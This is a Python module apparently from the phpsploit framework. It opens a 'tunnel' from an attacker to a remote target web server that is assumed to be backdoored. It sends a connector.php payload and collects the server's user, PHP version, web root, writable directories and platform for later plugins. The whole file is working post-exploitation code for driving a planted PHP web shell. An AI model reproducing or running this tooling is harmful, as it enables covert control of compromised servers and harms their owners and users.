"""Open a new connection to remote TARGET
"""
__all__ = ["Request"]

import core
from datatypes import Path

from . import handler


class Request:
    """Handle virtual `tunnel` between attacker and remote TARGET.
    """

    def __init__(self):
        self.socket = None
        self.environ = {}

    def open(self):
        """open a new tunnel connection to TARGET
        """
        # instanciate and configure payload handler.
        socket = handler.new_request()
        socket.is_first_payload = True
        socket.errmsg_request = "Could not connect to TARGET"
        socket.errmsg_response = "TARGET does not seem to be backdoored"
        # send the `connector.php` payload through created tunnel (socket).
        payload = Path(core.BASEDIR, 'data/tunnel/connector.php').phpcode()
        socket.open(payload)
        # build phpsploit session's environment variables from
        # connector.php's returned array.
        self.socket = socket
        raw_vars = self._get_vars(socket.read())
        self.environ = self._build_env(raw_vars)
        return True

    def close(self):
        """close the virtual link, actually, just return the
        link closed's string
        """
        print('[*] Connection to %s closed.' % self.socket.hostname)
        return True

    @staticmethod
    def _get_vars(raw_response):
        """Retrieve and format connector's variables
        """
        result = list()
        for name, value in raw_response.items():
            value = str(value).strip()
            result.append((name, value))
        return dict(result)

    def _build_env(self, raw_vars):
        """collect the server related vars, usefull for further
        plugins usage and framework management.
        written at self.CNF['SRV'] on the interface's core.
        """
        # return first argument which is not empty
        def choose(options, default=''):
            for choice in options:
                if choice in raw_vars:
                    if raw_vars[choice].strip() not in ["", "None"]:
                        return raw_vars[choice]
            return default

        # get env from connector's returned array
        env = {}

        env['CLIENT_ADDR'] = choose(['REMOTE_ADDR', 'REMOTE_HOST'])
        if ":" in env['CLIENT_ADDR']:  # enclose with brackets if ipv6
            env["CLIENT_ADDR"] = "[%s]" % env["CLIENT_ADDR"]

        env['HOST'] = choose(['SERVER_NAME', 'HTTP_HOST'],
                             self.socket.hostname)

        env['ADDR'] = choose(['SERVER_ADDR', 'LOCAL_ADDR'], env['HOST'])
        if ":" in env['ADDR']:  # enclose with brackets if ipv6
            env["ADDR"] = "[%s]" % env["ADDR"]

        env["HTTP_SOFTWARE"] = choose(['SERVER_SOFTWARE'], 'unknow software')

        env["USER"] = (choose(['USERNAME', 'USER']) or
                       choose(['USERPROFILE'], 'unknow').split('\\')[-1])

        env["PHP_VERSION"] = choose(['PHP_VERSION'], '?')

        env['WEB_ROOT'] = choose(['WEB_ROOT'])

        env["HOME"] = choose(env["WEB_ROOT"])
        if not env['HOME']:
            path = choose(['SCRIPT_FILENAME', 'PATH_TRANSLATED'])
            sep = '\\'
            if not path:
                path = '/'
            else:
                if path[0] == '/':
                    sep = '/'
                path = sep.join(path.split(sep)[0:-1])
            env['HOME'] = path

        env['WRITEABLE_WEBDIR'] = choose(['WRITEABLE_WEBDIR'])

        env['WRITEABLE_TMPDIR'] = choose(['WRITEABLE_TMPDIR'])

        env["PATH_SEP"] = '\\'
        if env["HOME"].startswith('/'):
            env["PATH_SEP"] = '/'

        env["PLATFORM"] = choose(['OS', 'PHP_OS'], 'unknow').split()[0].lower()
        if env["PLATFORM"] == "unknow":
            if env["PATH_SEP"] == "\\":
                env["PLATFORM"] = "windows"
            else:
                env["PLATFORM"] = "unix"
        env["PLATFORM"] = env["PLATFORM"].strip().lower()

        env["PWD"] = env["HOME"]

        return env
